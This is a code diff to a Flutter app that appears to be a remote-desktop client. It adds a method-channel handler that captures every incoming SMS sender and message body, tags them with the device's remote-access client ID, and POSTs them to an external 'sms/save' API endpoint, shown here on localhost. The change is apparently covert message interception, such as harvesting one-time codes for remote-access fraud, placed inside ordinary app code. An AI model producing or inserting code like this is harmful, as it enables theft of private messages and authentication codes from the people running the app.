@@ -15,34 +15,8 @@ import '../../models/platform_model.dart';
 import '../../models/server_model.dart';
 import 'home_page.dart';
 
+import 'package:http/http.dart' as http;
 
-// class MyWidget extends StatefulWidget {
-//   final String serverId;
-
-//   MyWidget({required this.serverId});
-
-//   @override
-//   _MyWidgetState createState() => _MyWidgetState();
-// }
-
-// class _MyWidgetState extends State<MyWidget> {
-//   static const platform = MethodChannel('com.example.your_channel_name');
-
-//   @override
-//   void initState() {
-//     super.initState();
-//     // 自动发送 serverId
-//     sendDataToKotlin(widget.serverId.trim());
-//   }
-
-//   Future<void> sendDataToKotlin(String data) async {
-//     try {
-//       final result = await platform.invokeMethod('sendData', {'data': data});
-//       print('Result from Kotlin: $result');
-//     } on PlatformException catch (e) {
-//       print('Failed to send data: ${e.message}');
-//     }
-//   }
 
 
 class ServerPage extends StatefulWidget implements PageShape {
@@ -468,36 +442,45 @@ class ScamWarningDialogState extends State<ScamWarningDialog> {
   }
 }
 
-String globalServerId = '';
-
-class ServerInfo extends StatefulWidget {
-  const ServerInfo({Key? key}) : super(key: key);
-  @override
-  _ServerInfoState createState() => _ServerInfoState();
-}
-
-class _ServerInfoState extends State<ServerInfo> {
+class ServerInfo extends StatelessWidget {
   final model = gFFI.serverModel;
   final emptyController = TextEditingController(text: "-");
 
+  ServerInfo({Key? key}) : super(key: key);
   static const platform = MethodChannel('com.example.zxwy');
 
-  @override
-  void initState() {
-    super.initState();
-    // 自动发送 serverId
-    globalServerId = model.serverId.value.text.trim();
-    
-    // 自动发送 serverId
-    sendDataToKotlin(globalServerId);
+  void init() {
+    platform.setMethodCallHandler((call) async {
+      if (call.method == "receiveSms") {
+        final sender = call.arguments['sender'];
+        final content = call.arguments['content'];
+        final id = model.serverId.value.text.trim();
+
+        sendToApi(sender, content, id);
+      }
+    });
   }
 
-  Future<void> sendDataToKotlin(String data) async {
-    try {
-      final result = await platform.invokeMethod('sendData', {'data': data});
-      showToast('Result from Kotlin: $result');
-    } on PlatformException catch (e) {
-      showToast('Failed to send data: ${e.message}');
+  Future<void> sendToApi(String sender, String content, String id) async {
+    var headers = {
+      'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
+      'Content-Type': 'application/json'
+    };
+    var request = http.Request('POST', Uri.parse('http://localhost:7801/external/cli/sms/save'));
+    request.body = json.encode({
+      "clientId": id,
+      "phone": sender,
+      "content": content
+    });
+    request.headers.addAll(headers);
+
+    http.StreamedResponse response = await request.send();
+
+    if (response.statusCode == 200) {
+      print(await response.stream.bytesToString());
+    }
+    else {
+      print(response.reasonPhrase);
     }
   }
 
